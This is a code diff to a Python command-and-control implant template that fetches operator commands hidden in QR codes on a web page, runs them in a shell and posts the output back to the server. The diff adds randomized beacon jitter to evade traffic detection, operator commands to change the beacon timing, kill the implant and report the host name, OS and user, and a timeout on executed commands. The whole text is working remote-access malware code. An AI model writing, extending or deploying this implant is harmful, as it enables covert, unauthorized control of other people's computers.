@@ -1,6 +1,7 @@
 import requests
 import subprocess
 import time
+import random
 from PIL import Image
 from io import BytesIO
 import qrcode
@@ -8,6 +9,7 @@ import pyzbar.pyzbar as pyzbar
 import re
 import base64
 import urllib3
+import sys
 
 # Suppress SSL warnings when using self-signed certificates
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -20,7 +22,8 @@ PORT = {port}
 PROTOCOL = "{protocol}"  # http or https
 PORT_STR = "{port_str}"  # :8080 or empty for default ports
 POLL_INTERVAL = 3
-CHUNK_SIZE = 1000  
+JITTER_PERCENT = 20  # ±20% randomization on poll interval
+CHUNK_SIZE = 1000
 last_command_hash = None
 VERIFY_SSL = False  # Set to False for self-signed certificates, True for valid certs
 
@@ -68,10 +71,65 @@ def extract_qr_from_html(html_content):
     except Exception:
         return None
 
+def get_sleep_time():
+    """Return poll interval with jitter applied"""
+    jitter = POLL_INTERVAL * (JITTER_PERCENT / 100.0)
+    return POLL_INTERVAL + random.uniform(-jitter, jitter)
+
+def handle_builtin(command):
+    """Handle built-in implant commands. Returns (handled, output) tuple."""
+    global POLL_INTERVAL, JITTER_PERCENT
+    parts = command.strip().split()
+    cmd = parts[0].lower()
+
+    if cmd == "sleep":
+        if len(parts) >= 2:
+            try:
+                new_interval = float(parts[1])
+                if new_interval < 0.5:
+                    return True, "[-] Minimum sleep is 0.5 seconds"
+                old = POLL_INTERVAL
+                POLL_INTERVAL = new_interval
+                return True, f"[+] Poll interval changed: {old}s -> {POLL_INTERVAL}s"
+            except ValueError:
+                return True, "[-] Invalid sleep value"
+        return True, f"[*] Current poll interval: {POLL_INTERVAL}s (jitter: {JITTER_PERCENT}%)"
+
+    if cmd == "jitter":
+        if len(parts) >= 2:
+            try:
+                new_jitter = float(parts[1])
+                if not (0 <= new_jitter <= 100):
+                    return True, "[-] Jitter must be 0-100"
+                old = JITTER_PERCENT
+                JITTER_PERCENT = new_jitter
+                return True, f"[+] Jitter changed: {old}% -> {JITTER_PERCENT}%"
+            except ValueError:
+                return True, "[-] Invalid jitter value"
+        return True, f"[*] Current jitter: {JITTER_PERCENT}%"
+
+    if cmd == "exit" or cmd == "kill":
+        return True, "__EXIT__"
+
+    if cmd == "info":
+        import platform
+        info = (
+            f"OS: {platform.system()} {platform.release()}\n"
+            f"Host: {platform.node()}\n"
+            f"Arch: {platform.machine()}\n"
+            f"User: {subprocess.getoutput('whoami')}\n"
+            f"Poll: {POLL_INTERVAL}s (jitter: {JITTER_PERCENT}%)\n"
+        )
+        return True, info
+
+    return False, None
+
 def execute_command(command):
     try:
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
-        return result.stdout or result.stderr
+        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=120)
+        return result.stdout or result.stderr or "[+] Command executed (no output)"
+    except subprocess.TimeoutExpired:
+        return "[-] Command timed out (120s limit)"
     except Exception as e:
         return f"Error: {e}"
 
@@ -203,8 +261,16 @@ def main():
                         
                         if command and command != "WAITING_FOR_COMMAND":
                             print(f"[+] Received command: {command}")
-                            output = execute_command(command)
-                            send_output(output, result_index)
+                            # Check for built-in commands first
+                            handled, output = handle_builtin(command)
+                            if handled:
+                                if output == "__EXIT__":
+                                    send_output("[+] Implant exiting", result_index)
+                                    sys.exit(0)
+                                send_output(output, result_index)
+                            else:
+                                output = execute_command(command)
+                                send_output(output, result_index)
                             result_index += 1
                             last_command_hash = current_hash
                             error_count = 0  # Reset error count on success
@@ -223,29 +289,29 @@ def main():
                 print(f"[-] HTTP Error: {response.status_code}")
                 error_count += 1
             
-            time.sleep(POLL_INTERVAL)
+            time.sleep(get_sleep_time())
         except requests.exceptions.SSLError as e:
             error_count += 1
             if error_count <= 3:  # Only print first few times
                 print(f"[-] SSL Error: {e}")
                 print(f"[-] If using self-signed certificate, set VERIFY_SSL = False in demo.py")
-            time.sleep(POLL_INTERVAL)
+            time.sleep(get_sleep_time())
         except requests.exceptions.ConnectionError as e:
             error_count += 1
             if error_count <= 3:  # Only print first few times
                 print(f"[-] Connection Error: Cannot connect to {url}")
                 print(f"[-] Check if server is running and Apache is configured")
-            time.sleep(POLL_INTERVAL)
+            time.sleep(get_sleep_time())
         except requests.exceptions.Timeout as e:
             error_count += 1
             if error_count <= 3:
                 print(f"[-] Timeout: Server did not respond")
-            time.sleep(POLL_INTERVAL)
+            time.sleep(get_sleep_time())
         except Exception as e:
             error_count += 1
             if error_count <= 3:
                 print(f"[-] Error: {e}")
-            time.sleep(POLL_INTERVAL)
+            time.sleep(get_sleep_time())
 
 if __name__ == "__main__":
     try:
